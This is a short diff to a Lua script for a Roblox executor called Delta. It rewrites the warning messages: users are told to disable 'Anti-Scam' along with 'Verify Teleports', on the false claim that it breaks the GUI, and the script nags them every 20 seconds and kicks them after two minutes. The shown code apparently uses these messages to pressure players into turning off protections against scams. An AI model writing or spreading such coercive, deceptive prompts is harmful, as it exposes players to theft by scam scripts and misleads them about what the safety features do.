@@ -252,7 +252,7 @@ if exec == "Delta" then
     end
 
     -- Initial notification
-    notify("Detected Delta Executor! Please disable 'Verify Teleports' to avoid getting kicked.")
+    notify("Detected Delta Executor! Please disable Anti-Scam Because its breaking the gui & to avoid getting kicked.")
 
     -- Kick player after 2min
     task.spawn(function()
@@ -264,10 +264,11 @@ if exec == "Delta" then
     task.spawn(function()
         while true do
             task.wait(20)
-            notify("Reminder: Turn OFF 'Verify Teleports' in Delta and rejoin to avoid getting kicked !")
+            notify("Reminder: Turn OFF 'Verify Teleports and Anti-Scam' in Delta and rejoin to avoid getting kicked !")
         end
     end)
 end
+
 
 
 
